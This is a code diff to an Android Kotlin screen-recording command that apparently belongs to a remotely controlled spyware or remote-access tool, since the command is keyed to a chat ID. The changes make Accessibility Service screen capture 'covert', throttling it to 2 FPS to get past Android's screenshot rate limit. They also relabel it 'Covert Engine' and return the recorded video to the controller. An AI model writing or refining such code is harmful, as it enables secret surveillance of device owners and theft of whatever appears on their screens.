@@ -49,9 +49,9 @@ class ScreenRecordCommand @Inject constructor(
         private const val MIN_SECONDS = 5
         private const val MAX_SECONDS = 60
         private const val DEFAULT_SECONDS = 15
-        private const val BITRATE_KBPS = 4000  // 4 Mbps (fixed from 8000)
-        private const val FPS = 15  // High quality (fixed from 2)
-        private const val MIN_DISK_SPACE_MB = 100  // Minimum free space
+        private const val BITRATE_KBPS = 2000  // 2 Mbps
+        private const val FPS = 2  // Safe 2 FPS covert timelapse (respects Android rigid screenshot limit)
+        private const val MIN_DISK_SPACE_MB = 50  // Minimum free space
     }
 
     override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
@@ -63,7 +63,7 @@ class ScreenRecordCommand @Inject constructor(
         }
         val outputFile = File(recordingsDir, "screenrecord_${System.currentTimeMillis()}.mp4")
 
-        Log.i(TAG, "🎬 Requesting screen recording for ${durationSeconds}s (15 FPS, adaptive quality)")
+        Log.i(TAG, "🎬 Requesting screen recording for ${durationSeconds}s ($FPS FPS covert mode)")
 
         // Validate prerequisites
         val diskCheck = validateDiskSpace(recordingsDir, durationSeconds)
@@ -91,13 +91,14 @@ class ScreenRecordCommand @Inject constructor(
 
         // ── Engine 2: Accessibility Screen Recording ───────────────────────────
         if (screenshotManager.isAccessibilityServiceEnabled()) {
-            Log.i(TAG, "Using Accessibility Screen Recorder Engine (15 FPS)")
+            Log.i(TAG, "Using Accessibility Screen Recorder Engine ($FPS FPS)")
             val a11yResult = recordViaAccessibility(outputFile, durationSeconds)
             if (a11yResult.success) {
                 return a11yResult
             } else {
                 outputFile.delete()  // Cleanup on failure
                 Log.e(TAG, "Accessibility recording failed: ${a11yResult.message}")
+                return a11yResult
             }
         }
 
@@ -166,10 +167,10 @@ class ScreenRecordCommand @Inject constructor(
      * Record via Accessibility Service with streaming encoding (no memory bloat).
      */
     private suspend fun recordViaAccessibility(outputFile: File, durationSeconds: Int): CommandResult {
-        val totalFrames = durationSeconds * FPS  // No artificial cap!
-        val intervalMs = 1000L / FPS
+        val totalFrames = durationSeconds * FPS
+        val intervalMs = 650L  // 650ms guarantees clearance past Android AOSP rigid interval limit
 
-        Log.i(TAG, "🎬 Capturing $totalFrames frames over ${durationSeconds}s @ $FPS FPS")
+        Log.i(TAG, "🎬 Capturing up to $totalFrames frames over ${durationSeconds}s ($FPS FPS covert mode)")
 
         return try {
             // Use streaming encoder instead of storing all bitmaps
@@ -201,8 +202,7 @@ class ScreenRecordCommand @Inject constructor(
                             framesEncoded++
                             consecutiveFailures = 0
 
-                            // Adaptive backoff on errors
-                            if (framesEncoded % 30 == 0) {
+                            if (framesEncoded % 5 == 0) {
                                 Log.d(TAG, "📹 Progress: $framesEncoded/$totalFrames frames")
                             }
                         } else {
@@ -213,6 +213,12 @@ class ScreenRecordCommand @Inject constructor(
                                 Log.e(TAG, "Too many consecutive failures — aborting")
                                 break
                             }
+                        }
+                    } else {
+                        consecutiveFailures++
+                        if (consecutiveFailures >= 5) {
+                            Log.w(TAG, "Consecutive capture failures reached threshold")
+                            break
                         }
                     }
                     kotlinx.coroutines.delay(intervalMs)
@@ -236,14 +242,14 @@ class ScreenRecordCommand @Inject constructor(
             // Finalize encoding
             encoder.release()
 
-            if (framesEncoded < (durationSeconds * FPS / 2)) {
+            if (framesEncoded < 2) {
                 Log.w(TAG, "⚠️ Too few frames captured: $framesEncoded")
                 outputFile.delete()
                 return CommandResult(
                     success = false,
-                    message = "❌ <b>Recording Failed</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
-                            "Only captured $framesEncoded frames.\n" +
-                            "Accessibility Service may be disabled."
+                    message = "❌ <b>Screen Recording Incomplete</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+                            "Only captured $framesEncoded frame(s).\n" +
+                            "Screen may have been turned off or sleeping."
                 )
             }
 
@@ -256,16 +262,14 @@ class ScreenRecordCommand @Inject constructor(
             }
 
             val sizeMB = String.format("%.2f", outputFile.length() / 1024.0 / 1024.0)
-            val actualFps = framesEncoded / durationSeconds
-            Log.i(TAG, "✅ Recording complete: $sizeMB MB, $framesEncoded frames @ ${actualFps}fps")
+            Log.i(TAG, "✅ Recording complete: $sizeMB MB, $framesEncoded frames")
 
             CommandResult(
                 success = true,
-                message = "🎬 <b>Screen Recorded (Accessibility Engine)</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+                message = "🎬 <b>Screen Recorded (Covert Engine)</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
                         "📹 Duration: ${durationSeconds}s\n" +
-                        "📊 Quality: $actualFps FPS (streamed encoding)\n" +
-                        "💾 Size: $sizeMB MB\n" +
-                        "📐 Frames: $framesEncoded captured",
+                        "📊 Frames: $framesEncoded captured\n" +
+                        "💾 Size: $sizeMB MB",
                 videoFile = outputFile
             )
         } catch (e: Exception) {
